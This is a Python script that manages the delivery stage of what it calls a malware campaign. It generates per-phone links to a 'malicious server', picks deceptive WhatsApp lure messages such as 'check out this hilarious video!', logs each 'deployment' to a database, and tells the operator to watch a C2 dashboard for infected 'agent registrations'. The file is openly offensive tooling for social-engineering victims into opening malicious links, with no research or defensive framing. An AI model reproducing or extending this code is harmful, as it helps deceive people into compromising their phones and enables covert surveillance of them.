import random
import sqlite3
from datetime import datetime

class DeploymentManager:
    def __init__(self, c2_url, malicious_url):
        self.c2_url = c2_url
        self.malicious_url = malicious_url
        self.deployment_count = 0
        
    def generate_deployment_link(self, phone_id):
        return f"{self.malicious_url}/video?phone={phone_id}"
    
    def get_social_engineering_messages(self):
        return [
            "Hey, check out this hilarious video! 😂 {link}",
            "You won't believe what I found! 🤯 {link}",
            "This is too funny not to share! 🎬 {link}",
            "Remember that thing we talked about? 👀 {link}",
            "This video is going viral! 📹 {link}",
            "Thought you'd find this interesting! 😊 {link}"
        ]
    
    def deploy_to_target(self, target_phone, agent_id, source_phone="admin"):
        self.deployment_count += 1
        
        malicious_link = self.generate_deployment_link(agent_id)
        message = random.choice(self.get_social_engineering_messages()).format(link=malicious_link)
        
        print("🎯 DEPLOYMENT INITIATED")
        print(f"Target: {target_phone}")
        print(f"Agent ID: {agent_id}")
        print(f"Message: {message}")
        print(f"Link: {malicious_link}")
        print("-" * 50)
        
        try:
            conn = sqlite3.connect('../server/mp_agent.db')
            conn.execute(
                'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
                (target_phone, source_phone, message, 'deployed', datetime.now())
            )
            conn.commit()
            conn.close()
            print("✅ Deployment logged to database")
        except Exception as e:
            print(f"❌ Database logging failed: {e}")
        
        return {
            'target': target_phone,
            'agent_id': agent_id,
            'link': malicious_link,
            'message': message
        }
    
    def mass_deploy(self, targets):
        print("🚀 MASS DEPLOYMENT STARTING...")
        print(f"C2 Server: {self.c2_url}")
        print(f"Malicious Server: {self.malicious_url}")
        print("=" * 60)
        
        results = []
        for target, agent_id in targets.items():
            result = self.deploy_to_target(target, agent_id)
            results.append(result)
            
        print("\n✅ MASS DEPLOYMENT COMPLETE!")
        print(f"Total deployments: {len(results)}")
        
        return results

def main():
    # UPDATE THESE AFTER RENDER DEPLOYMENT
    C2_URL = "https://your-c2-server.onrender.com"
    MALICIOUS_URL = "https://your-malicious-server.onrender.com"
    
    deployer = DeploymentManager(C2_URL, MALICIOUS_URL)
    
    targets = {
        'phone_001': 'phone_001',
        'phone_002': 'phone_002', 
        'phone_003': 'phone_003',
        'phone_007': 'phone_007'
    }
    
    print("MP_AGENT Deployment Manager")
    print("=" * 50)
    
    results = deployer.mass_deploy(targets)
    
    print("\n🎯 NEXT STEPS:")
    print("1. Send each WhatsApp message to the corresponding phone")
    print("2. Monitor dashboard for agent registrations")
    print(f"3. Dashboard: {C2_URL}")

if __name__ == "__main__":
    main()